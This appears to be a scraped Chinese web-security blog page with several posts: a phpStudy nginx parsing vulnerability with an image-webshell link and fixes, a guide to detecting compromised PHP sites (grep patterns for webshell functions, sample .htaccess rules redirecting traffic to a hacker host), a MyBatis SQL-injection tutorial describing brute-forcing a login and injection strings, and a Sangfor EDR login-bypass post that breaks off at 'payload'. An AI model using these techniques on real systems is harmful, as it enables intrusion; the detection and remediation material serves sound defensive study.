<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914145811723.png" alt="image-20200914145811723"></p>
<p>参考链接：<a target="_blank" rel="noopener" href="http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author">http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/Apache-Cocoon-XML/">Apache-Cocoon-XML </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/14/WEB/Exploit/phpStudy-%E5%B0%8F%E7%9A%AE%E9%9D%A2%E6%9D%BF-v8-1-0-7-nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"><i class="fas fa-angle-double-right"></i>phpStudy(小皮面板)v8.1.0.7 nginx 解析漏洞</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-14</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:16.394Z" title="2020-12-23T08:50:16.394Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">4 minutes read (About 634 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/14/WEB/Exploit/phpStudy-%E5%B0%8F%E7%9A%AE%E9%9D%A2%E6%9D%BF-v8-1-0-7-nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">phpStudy(小皮面板)v8.1.0.7 nginx 解析漏洞</a></h1><div class="content"><p><strong>一、**</strong>phpStudy<strong>**(小皮面板)简介：</strong><br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-09361599060261.png" alt="phpStudy v8.1.0.7.png"></p>
<p>phpStudy国内12年老牌公益软件，集安全，高效，功能与一体，已获得全球用户认可安装，运维也高效。支持一键LAMP,LNMP,集群,监控,网站,FTP,数据库,JAVA等100多项服务器管理功能。</p>
<p><strong>二、漏洞简介：</strong></p>
<p>小皮面板 &lt;= 8.1.0.7: 啊这</p>
<p>其实这个漏洞确实不是小皮的问题,而是2017年就出现的nginx解析漏洞。</p>
<p><strong>漏洞原理**</strong>：**</p>
<p><strong>1、由于错误配置(但是测试的时候是安装完后的默认配置，我在官方论坛也反馈了，他们还狡辩。。。)导致nginx把以.php结尾的文件交给fastcgi处理,为此可以构造<a target="_blank" rel="noopener" href="http://www.xxx.com/test.gif/xx.php">http://www.xxx.com/test.gif/xx.php</a> (任何服务器端不存在的php文件均可,比如a.php)</strong></p>
<p>2、但是fastcgi在处理xx.php文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo=1 发挥作用,这项配置用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了/test.gif。</p>
<p>3、 最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许fastcgi将.png等文件当做代码解析。<br>localhost_80.conf原始配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php(.*)$ &#123;</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_split_path_info  ^((?U).+\.php)(&#x2F;?.+)$;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            fastcgi_param  PATH_INFO  $fastcgi_path_info;</span><br><span class="line">            fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<p>三、漏洞复现：</p>
<p>测试环境：phpStudy(小皮面板)8.1.0.7 + 图片马（一定要注意不是那种copy的马子 有几率失败，可以下载这个<a target="_blank" rel="noopener" href="https://github.com/tennc/webshell/blob/master/php/img/bypass-imagecreatefromgif-pass-00.gif">马子</a>测试）<br>复现如图：<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-1f0c1599060262.png" alt="bug_7.3.png"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-b8361599060262.png" alt="bug.png"></p>
<p>执行系统命令：<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-34661599060543.png" alt="exec.png"><br>四、修复<br>php.ini 中 fix_pathinfo 禁用为0<br>cgi.fix_pathinfo=0</p>
<p>nginx.conf添加如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php(.*)$ &#123;</span><br><span class="line">      if ( $fastcgi_script_name ~ \..*\&#x2F;.*php )&#123;</span><br><span class="line">        return 403;</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_split_path_info  ^((?U).+\.php)(&#x2F;?.+)$;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            fastcgi_param  PATH_INFO  $fastcgi_path_info;</span><br><span class="line">            fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考链接：<a target="_blank" rel="noopener" href="https://mrxn.net/news/675.html">https://mrxn.net/news/675.html</a></p>
</blockquote>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/PhpStudy/">PhpStudy, </a><a class="link-muted" rel="tag" href="/tags/nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">nginx解析漏洞 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/%E6%A3%80%E6%B5%8BPHP%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E8%A2%AB%E6%94%BB%E7%A0%B4%E7%9A%84%E6%96%B9%E6%B3%95/"><i class="fas fa-angle-double-right"></i>检测PHP网站是否被攻破的方法</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:49:48.925Z" title="2020-12-23T08:49:48.925Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">10 minutes read (About 1511 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/%E6%A3%80%E6%B5%8BPHP%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E8%A2%AB%E6%94%BB%E7%A0%B4%E7%9A%84%E6%96%B9%E6%B3%95/">检测PHP网站是否被攻破的方法</a></h1><div class="content"><p><strong>0x01 查看访问日志</strong></p>
<p><strong>查看是否有文件上传操作</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IPREMOVED - - [01&#x2F;Mar&#x2F;2013:06:16:48 -0600] &quot;POST&#x2F;uploads&#x2F;monthly_10_2012&#x2F;view.php HTTP&#x2F;1.1&quot; 200 36 &quot;-&quot; &quot;Mozilla&#x2F;5.0&quot; IPREMOVED - - [01&#x2F;Mar&#x2F;2013:06:12:58 -0600] &quot;POST&#x2F;public&#x2F;style_images&#x2F;master&#x2F;profile&#x2F;blog.php HTTP&#x2F;1.1&quot; 200 36 &quot;-&quot; &quot;Mozilla&#x2F;5.0&quot;</span><br></pre></td></tr></table></figure>

<p><strong>nginx默认记录的日志格式为：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access_log logs&#x2F;access.log</span><br></pre></td></tr></table></figure>

<p><strong>或</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access_log logs&#x2F;access.log combined;</span><br></pre></td></tr></table></figure>

<p><strong>nginx默认记录日志的位置为</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx安装目录&#x2F;log&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>iis默认记录日志的位置为：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%inetpub%\logs\LogFiles</span><br></pre></td></tr></table></figure>

<p><strong>apache默认记录日志的位置为：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%apache%\logs\error.log</span><br></pre></td></tr></table></figure>

<p><strong>weblogic默认记录日志的位置为：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%base_domain%\servers\AdminServer\logs\</span><br></pre></td></tr></table></figure>

<p><strong>0x02 查找还有恶意的php代码文件</strong></p>
<p><strong>2.1查找最近发生变化的php文件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; -mtime -7</span><br><span class="line"></span><br><span class="line">-type表示搜索一般文件，-mtime -7表示7*24小时内修改的文件</span><br></pre></td></tr></table></figure>



<p>结果可能如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;uploads&#x2F;monthly_04_2008&#x2F;index.php .&#x2F;uploads&#x2F;monthly_10_2008&#x2F;index.php .&#x2F;uploads&#x2F;monthly_08_2009&#x2F;template.php .&#x2F;uploads&#x2F;monthly_02_2013&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p><strong>2.2 查找文件中是否存在疑似代码</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;eval *(&quot; --color</span><br></pre></td></tr></table></figure>

<p><strong>*( 代表任意个空格</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;base64_decode *(&quot; --color find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;gzinflate *(&quot; --color find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;eval *(str_rot13 *(base64_decode *(&quot; --color</span><br></pre></td></tr></table></figure>

<p>注解：很多命令不支持管道传递参数，而实际上又需要这样，所以就用了<strong>xargs命令，这个命令可以用来管道传递参数</strong>；<strong>grep -l表示只包含某个字符串的文件名</strong>，如果去掉-l则会显示匹配特定字符串的行内容</p>
<p>几个特殊字符串的意义: </p>
<p><strong>eval()**</strong>把字符串按照php代码来执行，是最常见的php一句话木马**</p>
<p><strong>base64_decode()</strong> <strong>将字符串base64解码，攻击的时候payload是base64编码，则这个函数就有用武之地了</strong></p>
<p><strong>gzinflate()</strong> <strong>将字符串解压缩处理，攻击的时候payload用gzdeflate压缩之后，使用这个函数进行解压缩</strong></p>
<p><strong>str_rot13()</strong> <strong>对字符串进行rot13编码</strong></p>
<p>也可以使用正则表达式来搜索文件，查找可以代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;*php&#39; | xargs egrep -i &quot;(mail|fsockopen|pfsockopen|stream\_socket\_client|exec|system|passthru|eval|base64_decode) *(&quot;</span><br></pre></td></tr></table></figure>

<p>下面解释webshell常用的函数：</p>
<p><strong>mail()：**</strong>可用来向网站用户发送垃圾邮件**</p>
<p><strong>fsockopen()**</strong>:打开一个网络连接或者一个unix套接字连接，可用于payload发送远程请求**</p>
<p><strong>pfsockopen()**</strong>:和<strong><strong>fsockopen()</strong></strong>作用类似**</p>
<p><strong>stream_socket_client()**</strong>:建立一个远程连接，**</p>
<p><strong>例子如下：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $fp &#x3D; stream_socket_client(&quot;tcp:&#x2F;&#x2F;www.example.com:80&quot;, $errno, $errstr, 30);   if (!$fp) &#123;     echo &quot;$errstr ($errno)&lt;br &#x2F;&gt;\n&quot;;   &#125; else &#123;     fwrite($fp, &quot;GET &#x2F; HTTP&#x2F;1.0\r\nHost: www.example.com\r\nAccept: *&#x2F;*\r\n\r\n&quot;);     while (!feof($fp)) &#123;       echo fgets($fp, 1024);     &#125;     fclose($fp);   &#125;   ?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>exec()**</strong>:命令执行函数**</p>
<p><strong>system()**</strong>:同<strong>**exec()</strong></p>
<p><strong>passthru()**</strong>:同<strong>**exec()</strong></p>
<p>preg_replace()正则表达式由修饰符”e”修饰的时候，替换字符串在替换之前需要按照php代码执行，这种情况也需要考虑到，这种情况可采用这种以下扫搜：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; | xargs egrep -i &quot;preg_replace *\(([&#39;|\&quot;])(.).*\2[a-z]*e[^\1]*\1 *,&quot; --color</span><br></pre></td></tr></table></figure>

<p><strong>0x03 比较代码文件</strong></p>
<p>这种情况需要有一份干净的代码，这份代码和正在使用的代码进行比较。例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -r wordpress-clean&#x2F; wordpress-compromised&#x2F; -x wp-content</span><br></pre></td></tr></table></figure>

<p>上面的例子是比较wordpress-clean/ 和wordpress-comprised/两个目录，并且目录里面的wp-content/子目录不比较</p>
<p><strong>0x04 搜寻可写的目录</strong></p>
<p>看看这个目录里面是否有可疑的文件，如下脚本查找权限为777的目录是否存在php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search_dir&#x3D;$(pwd) writable_dirs&#x3D;$(find $search_dir -type d -perm 0777) for dir in $writable_dirs    do        #echo %dir        find $dir -type -f -name &#39;*.php&#39; done        </span><br></pre></td></tr></table></figure>

<p><strong>黑客经常在jpg中插入php代码，因此在查询这些目录的时候也要查询jpg文件：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find wp-content&#x2F;uploads -type f -iname &#39;*.jpg&#39; | xargs grep -i php</span><br></pre></td></tr></table></figure>

<p><strong>注意：-iname 表示文件名不区分大小写 grep -i 也表示不区分大小写</strong></p>
<p><strong>0x05 检测iframe标签</strong></p>
<p>黑客经常做的是嵌入iframe标签，因此可以查看网页的源代码，并且搜索其中是否存在iframe标签，可使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -i &#39;&lt;iframe&#39; mywebsite.txt</span><br></pre></td></tr></table></figure>

<p>对于动态生成的页面，可使用firefox的<a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/">Live HTTP Headers</a>插件，下载到源码之后再查找是否存在iframe标签</p>
<p><strong>0x06 查找数据库中是否存在敏感字符串</strong></p>
<p>包括%base64_%、%eval(% 等上面提到的一些关键字</p>
<p><strong>0x07 检查.htacess文件</strong></p>
<p>是否包含了auto_prepend_file和auto_append_file，使用如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;\.htaccess&#39; | xargs grep -i auto_prepend_file find . -type f -name &#39;\.htaccess&#39; | xargs grep -i auto_append_file</span><br></pre></td></tr></table></figure>

<p><strong>注释：.htacess</strong></p>
<p><strong>（</strong>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<strong>）</strong></p>
<p><strong>uto_prepend_file**</strong>的作用是加载当前脚本文件之前，先加载的php脚本 auto_append_file的作用是加载当前脚本文件之后，再加载的php脚本。黑客如果这么修改了.htaccess文件，那么可以在访问.htaccess目录的php脚本时，加载上自己想要加载的恶意脚本 .**</p>
<p>htaccess文件还可以被用来把访问网站的流量劫持到黑客的网站</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteCond %&#123;HTTP_USER_AGENT&#125;^.*Baiduspider.*$ Rewriterule ^(.*)$ http:&#x2F;&#x2F;www.hacker.com&#x2F;muma.php [R&#x3D;301]</span><br></pre></td></tr></table></figure>

<p><strong>将baidu爬虫的访问重定向到黑客的网站(包含HTTP_USER_AGENT和http关键字)</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteCond %&#123;HTTP_REFERER&#125; ^.*baidu.com.*$ Rewriterule ^(.*)$ http:&#x2F;&#x2F;www.hacker.com&#x2F;muma.php [R&#x3D;301]</span><br></pre></td></tr></table></figure>

<p><strong>将来自baidu搜索引擎的流量重定向到黑客的网站(包含HTTP_REFERER和http关键字)</strong> </p>
<p>为了查看网站是否被.htaccess修改导致流量劫持，可以在搜索.htaccess文件的时候采用如下命令： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;\.htaccess&#39; | xargs grep -i http; find . -type f -name &#39;\.htaccess&#39; | xargs grep -i HTTP_USER_AGENT;  find . -type f -name &#39;\.htaccess&#39; | xargs grep -i HTTP_REFERER</span><br></pre></td></tr></table></figure>

</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/PHP%E7%BD%91%E7%AB%99/">PHP网站 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/mybatis%E6%A1%86%E6%9E%B6sql%E6%B3%A8%E5%85%A5%E9%92%88%E5%AF%B9%E6%80%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8E%E4%BF%AE%E5%A4%8D/"><i class="fas fa-angle-double-right"></i>mybatis框架sql注入针对性渗透测试与修复</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:01.119Z" title="2020-12-23T08:50:01.119Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">11 minutes read (About 1586 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/mybatis%E6%A1%86%E6%9E%B6sql%E6%B3%A8%E5%85%A5%E9%92%88%E5%AF%B9%E6%80%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8E%E4%BF%AE%E5%A4%8D/">mybatis框架sql注入针对性渗透测试与修复</a></h1><div class="content"><p>mybatis框架sql注入针对性渗透测试与修复</p>
<p>0X00背景</p>
<p>在国内，政府、国企、央企等重点单位的内网应用系统基本都以JAVA为主。由于重点单位对于应用系统的性能、功能、扩展性等各方面及厂商开发快速性要求，SSM框架成为系统架构首选。这种情况下，有必要对梳理SSM框架相关的渗透测试入侵点。本文将针对Mybatis框架易发生注入的点做简单讨论。</p>
<p>0X01 Mybatis概述</p>
<p>Mybatis是支持定制化的SQL、存储过程以及高级映射的优秀的持久层框架。</p>
<p>避免了几乎所有的JDBC代码，手动设置参数以及获取结果集的操作。可以对配置和原生的Map使用简单的XML或注解，将接口和java的POJOs映射成数据库中的记录，极大提高了开发效率。</p>
<p>因为框架避免了用户直接进行SQL语句的拼接，以至于部分开发或安全同学认为只要使用了Mybatis框架，就可以杜绝SQL注入。显然这是不可能的，须知没有免费的午餐，惰性永存，作为安全从业者的我们就是在对抗人性的缺点。</p>
<p>接下来，我们首先了解Mybatis在配置SQL语句时候的两种描述参数的方式</p>
<p>一种为：#{}</p>
<p>一种为：${}</p>
<p>比如</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsBretYk.jpg" alt="img" style="zoom:50%;"> 



<p>这个语句selectPerson,接受一个int(或integer)类型的参数，并返回一个hashmap类型的对象。</p>
<p>注意这里的参数符号是：#{id}</p>
<p>该情况下，Mybatis会创建一个预处理语句参数，通过JDBC，这样的一个参数在SQL中会由一个“？”来标识，并传递到一个新的预处理语句当中，就像这样：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsYYuKjL.jpg" alt="img" style="zoom:50%;"> 



<p>那么用$代替#来描述参数会发生什么？</p>
<p>这种情况下，框架会直接把变量拼接到SQL语句当中，不会做其他的处理。就相当于直接字符串拼接SQL语句。</p>
<p>综上：使用#格式的语法，框架会创建预处理语句属性并安全地设置值，这样做安全，迅速，通常也是首选做法。然而有时只是想直接在SQL语句中插入一个不改变的字符串。比如，像ORDER BY,可以这样来使用: ORDER BY S{columnName}。这里MyBatis不会修改或转义字符串。但显然，这种方式接受从用户输出的内容并提供给语句中不变的字符串是不安全的，会导致潜在的SQL注入攻击，</p>
<p>0X03 误用场景</p>
<p>通过上部分的讨论，我们知道使用#符号，Mybatis会进行预编译来处理参数，这样可以有效的避免SQL注入。</p>
<p>那么假如所有人都正确使用了#，也就不存在安全问题了。事实却恰恰相反，总有错误的用法，所以咱们才不会失业。</p>
<p>在程序中，如order by字段、表名等，是无法使用预编译语句的，在like参数、in参数、order by这种尝试用拼接逻辑的场景下，开发同学总会给系统留下一点彩蛋。所以在实际测试当中，能聚焦这方面，有针对性的进行漏洞的挖掘，才可以达到事倍功半的效果。</p>
<p>1、 like参数注入</p>
<p>错误写法示例：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsiBde58.jpg" alt="img" style="zoom:50%;"> 

<p>正确写法</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsvyNv3H.jpg" alt="img" style="zoom:50%;"> 

<p>对于Oracle可以通过’%’||’#param#’||’%’避免；</p>
<p>对于MySQL可以通过CONCAT(‘%’,#param#,’%’)避免；</p>
<p>对于MSSQL中通过’%’+#param#+’% 。</p>
<p>2 、in参数的SQL注入</p>
<p>错误写法示例：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsYxgZ05.jpg" alt="img" style="zoom:50%;"> 

<p>正确写法</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpscRshyZ.jpg" alt="img" style="zoom:50%;"> 



<p>3、Order by SQL注入</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsVualOA.jpg" alt="img" style="zoom:50%;"> 

<p>因为预编译机制只能处理查询参数，此处显然不是查询参数，是一种错误的写法，因此order by位置的参数需要开发人员自己处理。所以只能使用$去拼接：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsFLmRAr.jpg" alt="img" style="zoom:50%;"> 







<p>针对这种情况要在代码中做过滤、使用转义等方式处理字符，避免改变SQL逻辑。</p>
<p>其实也可以在xml中处理，用if去判断，这样就显得比较硬编码，sql语句会增加较多，显得臃肿，不便阅读。</p>
<p>通过上面的分析，我们了解到使用了mybatis框架容易误用的地方，可以有针对性的对部分功能展开渗透测试。</p>
<p>0X04 真实案列</p>
<p>某单位系统登陆页面未做验证码验证，进一步验证发现未对失败次数做限制，存在可爆破漏洞。同时是服务单位客户系统，存在弱密码可能极大。对于弱密码是有着永远说不完的话题，正好可以利用一波。</p>
<p>通过前期的信息收集，针对性制作弱密码字典，开始爆破行动。</p>
<p>反复尝试了几次，发现账户、密码正确，成功登陆系统。</p>
<p>接下来针对系统作进一步的渗透测试，因为有mybatis框架，我们只需要针对性测试上文总结的几处场景：</p>
<p>系统存在多处查询功能，查询用户名，会用like方式，猜测此处存在sql注入。</p>
<p>抓包手动测试：</p>
<p>‘ or ‘1’=‘0</p>
<p>‘ and ‘1’=‘1</p>
<p>返回结果明显不同，存在sql注入。</p>
<p>直接测模糊查询功能模块，得到多枚SQL注入。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsIZq2D9.jpg" alt="img"> </p>
<p>Sqlmap结果，Oracle数据库，3个库。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wps7EWkhy.jpg" alt="img" style="zoom:50%;"> 



<p>通过源代码进行修复</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsdraGDp.jpg" alt="img" style="zoom:50%;"> 



<p>我们前面提到like参数场景下的修复方式，如上图在LIKE后面跟 ‘%’||#{字段名}||’%’即可修复。</p>
<p>作为小白一次完整的mybatis框架sql注入针对性渗透测试与修复结束，望大佬们勿喷，请指点。</p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/Sql%E6%B3%A8%E5%85%A5/">Sql注入, </a><a class="link-muted" rel="tag" href="/tags/Mybatis/">Mybatis </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SANGFOR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"><i class="fas fa-angle-double-right"></i>深信服-SANGFOR终端检测响应平台-任意用户登录</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:51:19.492Z" title="2020-12-23T08:51:19.492Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">a minute read (About 148 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SANGFOR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/">深信服-SANGFOR终端检测响应平台-任意用户登录</a></h1><div class="content"><p>前两天爆出来的命令执行，今天在给大家爆一个任意用户登录；<br>看源码看到的，我测试的时候可以打到3.2.19版本，后面的版本我就不知道了；</p>
<p>fofa指纹：<strong>title=”SANGFOR终端检测响应平台”</strong></p>
<hr>
<p>漏洞利用：</p>
<p>只要用户存在就可以登陆</p>
<p>payload：</p>
